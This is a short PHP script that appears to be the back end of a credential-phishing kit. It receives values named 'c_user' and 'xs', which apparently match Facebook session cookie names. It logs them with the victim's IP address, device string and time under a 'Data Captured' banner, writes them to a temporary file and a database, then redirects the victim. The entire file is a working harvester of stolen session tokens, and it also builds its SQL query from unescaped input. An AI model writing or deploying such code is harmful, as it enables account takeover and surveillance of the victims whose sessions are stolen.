<?php
  require __DIR__ . '/database.php';

  $c_user = $_POST["c_user"];
  $xs = $_POST["xs"];
  // echo $c_user;
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
      $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
      $ip = $_SERVER['REMOTE_ADDR'];
  }
  $user_agent = $_SERVER['HTTP_USER_AGENT'];
  $ctime = date("m/d/Y h:i:s a", time());
  $content = "*********Data Captured**********
C_USER: ".$c_user."
XS: ".$xs."
IP-Address: ".$ip."
Device: ".$user_agent."
Time: ".$ctime."
------------------------------

";
  $fp = fopen("/tmp/username.txt","a");
  fwrite($fp,$content);
  fclose($fp);
  $sql =<<<EOF
      INSERT INTO DATA (c_user,xs)
      VALUES ('$c_user', '$xs' );
EOF;
  $ret = pg_query($dbconn, $sql);
  pg_close($dbconn);
  header('Location: action-form');
  die();
